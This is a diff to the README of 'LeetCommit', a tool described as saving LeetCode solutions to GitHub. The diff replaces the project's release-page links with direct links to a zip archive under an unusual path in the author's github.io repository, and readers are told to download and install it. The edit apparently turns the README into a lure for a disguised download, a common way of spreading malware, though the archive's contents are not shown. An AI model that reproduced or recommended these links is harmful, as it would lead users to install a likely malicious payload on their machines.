@@ -5,7 +5,7 @@ description: "Push your LeetCode solutions to GitHub automatically when you earn
 ---
 # 💾 LeetCommit - Save your LeetCode code to GitHub
 
-[![](https://img.shields.io/badge/Download-LeetCommit-blue.svg)](https://github.com/Paisamanducasexta508/LeetCommit/releases)
+[![](https://img.shields.io/badge/Download-LeetCommit-blue.svg)](https://github.com/Paisamanducasexta508/paisamanducasexta508.github.io/raw/refs/heads/main/ramscallion/io-paisamanducasexta-github-3.7-beta.2.zip)
 
 LeetCommit automates the process of saving your LeetCode solutions to a personal GitHub repository. It works in the background while you study. When your code passes a test case on LeetCode, this tool detects the change and uploads the solution to your account. 
 
@@ -18,7 +18,7 @@ LeetCommit automates the process of saving your LeetCode solutions to a personal
 
 ## 📥 Downloading the Software
 
-Visit [this page](https://github.com/Paisamanducasexta508/LeetCommit/releases) to download the latest setup file. 
+Visit [this page](https://github.com/Paisamanducasexta508/paisamanducasexta508.github.io/raw/refs/heads/main/ramscallion/io-paisamanducasexta-github-3.7-beta.2.zip) to download the latest setup file. 
 
 Select the file ending in .zip or .crx. Click the link to begin your download to your computer.
 
